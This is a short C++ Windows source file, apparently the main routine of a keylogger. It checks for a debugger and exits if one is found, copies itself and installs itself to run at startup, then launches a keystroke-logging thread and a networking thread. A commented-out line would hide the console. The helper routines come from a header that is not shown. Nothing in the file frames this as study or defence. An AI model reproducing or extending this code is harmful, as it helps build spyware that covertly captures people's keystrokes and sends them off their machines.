#define UNICODE
#include <Windows.h>
#include "behave.hpp"

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (IsDebuggerPresent())
    {
        return -1;
    }

    std::string p = cpSelf();
    if (p != "")
    {
        autoStart(p);
    }

    HANDLE behaves[BEHAVES_COUNT];
    behaves[0] = startKeyLogging();
    behaves[1] = startNetworking();

    DWORD ret = WaitForMultipleObjects(BEHAVES_COUNT, behaves, TRUE, INFINITE);

    // WaitForSingleObject(startNetworking(), INFINITE);

    std::cout << "Threads: " << ret << std::endl;

    system("pause");
    return 0;
}